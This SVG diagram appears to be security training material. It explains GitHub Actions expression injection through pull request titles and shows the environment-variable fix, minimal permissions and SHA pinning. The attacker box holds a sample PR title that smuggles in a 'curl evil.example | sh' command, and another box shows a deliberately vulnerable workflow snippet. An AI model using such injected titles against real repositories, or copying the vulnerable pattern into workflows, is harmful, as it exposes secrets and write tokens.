<svg xmlns="http://www.w3.org/2000/svg" width="1200" height="620" viewBox="0 0 1200 620" font-family="Segoe UI, Helvetica, Arial, sans-serif">
  <title>GitHub Actions script injection through untrusted event data, and the fix</title>
  <defs>
    <marker id="a" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#334155"/></marker>
    <marker id="r" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#dc2626"/></marker>
    <marker id="g" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#16a34a"/></marker>
  </defs>
  <rect width="1200" height="620" fill="#ffffff"/>
  <text x="40" y="46" font-size="28" font-weight="700" fill="#0f172a">GitHub Actions: expression injection</text>
  <text x="40" y="74" font-size="16" fill="#475569">The expression is pasted into the shell script BEFORE the shell runs. Attacker text becomes shell code.</text>

  <rect x="40" y="110" width="260" height="120" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
  <text x="170" y="138" text-anchor="middle" font-size="16" font-weight="700" fill="#991b1b">Attacker opens a PR / issue</text>
  <text x="170" y="164" text-anchor="middle" font-size="13" fill="#991b1b">title: fix"; curl evil.example</text>
  <text x="170" y="184" text-anchor="middle" font-size="13" fill="#991b1b">| sh; echo "   (shape only)</text>
  <text x="170" y="210" text-anchor="middle" font-size="12" fill="#991b1b">any user can write this field</text>

  <rect x="400" y="110" width="400" height="150" rx="12" fill="#fffbeb" stroke="#d97706" stroke-width="2"/>
  <text x="600" y="136" text-anchor="middle" font-size="16" font-weight="700" fill="#92400e">Workflow (vulnerable)</text>
  <text x="420" y="166" font-size="13" font-family="Consolas, monospace" fill="#92400e">on: pull_request_target</text>
  <text x="420" y="188" font-size="13" font-family="Consolas, monospace" fill="#92400e">run: echo "${{ github.event.</text>
  <text x="440" y="208" font-size="13" font-family="Consolas, monospace" fill="#92400e">pull_request.title }}"</text>
  <text x="420" y="236" font-size="12" fill="#92400e">secrets and a write token are available</text>

  <rect x="900" y="110" width="260" height="150" rx="12" fill="#fef2f2" stroke="#dc2626" stroke-width="2"/>
  <text x="1030" y="138" text-anchor="middle" font-size="16" font-weight="700" fill="#991b1b">Runner shell</text>
  <text x="1030" y="166" text-anchor="middle" font-size="13" fill="#991b1b">runs the attacker's text</text>
  <text x="1030" y="190" text-anchor="middle" font-size="13" fill="#991b1b">reads GITHUB_TOKEN, secrets</text>
  <text x="1030" y="214" text-anchor="middle" font-size="13" fill="#991b1b">sends them out, or pushes code</text>

  <line x1="300" y1="170" x2="398" y2="170" stroke="#dc2626" stroke-width="3" marker-end="url(#r)"/>
  <line x1="800" y1="185" x2="898" y2="185" stroke="#dc2626" stroke-width="3" marker-end="url(#r)"/>

  <rect x="40" y="310" width="1120" height="280" rx="12" fill="#f0fdf4" stroke="#16a34a" stroke-width="2"/>
  <text x="60" y="340" font-size="18" font-weight="700" fill="#166534">The fix: data stays data</text>
  <text x="60" y="372" font-size="14" font-family="Consolas, monospace" fill="#166534">env:</text>
  <text x="60" y="392" font-size="14" font-family="Consolas, monospace" fill="#166534">  TITLE: ${{ github.event.pull_request.title }}   # value goes into an environment variable</text>
  <text x="60" y="412" font-size="14" font-family="Consolas, monospace" fill="#166534">run: echo "$TITLE"                               # the shell reads it as plain text</text>
  <text x="60" y="450" font-size="15" font-weight="700" fill="#166534">Also</text>
  <text x="60" y="476" font-size="14" fill="#166534">1. Prefer pull_request over pull_request_target; never check out and run PR code with secrets or a write token.</text>
  <text x="60" y="500" font-size="14" fill="#166534">2. Set permissions: to the minimum (for example contents: read), per job.</text>
  <text x="60" y="524" font-size="14" fill="#166534">3. Pin third-party actions to a full commit SHA, not a tag (the tj-actions case, March 2025).</text>
  <text x="60" y="548" font-size="14" fill="#166534">4. Lint workflows in CI. Offline twin: 06-ai-devsecops/cicd workflow_lint and the CAISP poisoned-pipeline lab.</text>
  <text x="60" y="574" font-size="12" fill="#475569">Controls keep working even if one layer is missed: this is defense in depth.</text>
</svg>
